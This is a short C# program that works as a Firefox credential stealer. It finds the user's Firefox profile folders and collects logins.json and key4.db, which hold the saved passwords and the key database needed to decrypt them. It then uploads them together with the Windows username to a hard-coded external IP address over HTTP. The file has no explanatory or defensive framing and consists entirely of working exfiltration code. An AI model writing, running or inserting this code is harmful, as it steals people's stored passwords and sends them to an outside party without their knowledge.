using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Newtonsoft.Json;
class Program
{
    public static async Task Main(string[] args)
    {
        string PathS = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
        string Pattern = @"release";
        var Directories = Directory.GetDirectories(PathS);
        string[] filter = { "logins.json", "key4.db" };

        RegexOptions RegexOptions = RegexOptions.Multiline;

        List<string> Files = new List<string>();

        foreach (string Folder in Directories)
        {
            var Matches = Regex.Matches(Folder, Pattern, RegexOptions);

            if (Matches.Count > 0)
            {
                string[] Fast = Directory.GetFiles(Folder);

                for (int i = 0; i < filter.Length; i++)
                {
                    string Combination = Path.Combine(Folder, filter[i]);

                    if (File.Exists(Combination))
                    {
                        Files.Add(Combination);
                    }
                }

            }
        }

        await Send(Files);
    }

    public static async Task Send(List<string> Paths)
    {
        using(HttpClient http = new HttpClient())
        using(MultipartFormDataContent formData = new MultipartFormDataContent())
        {

            foreach (string Path in Paths)
            {
                var filestream = File.OpenRead(Path);
                var filecontent = new StreamContent(filestream);
                filecontent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("multipart/form-data");
                formData.Add(filecontent, "files", System.IO.Path.GetFileName(Path));
                formData.Add(new StringContent(Environment.UserName), "username");
            }

            Uri uri = new Uri("http://4.228.217.126:5000/JustTwoOfUs");

            HttpResponseMessage responseMessage = await http.PostAsync(uri, formData);
        }
    }
}
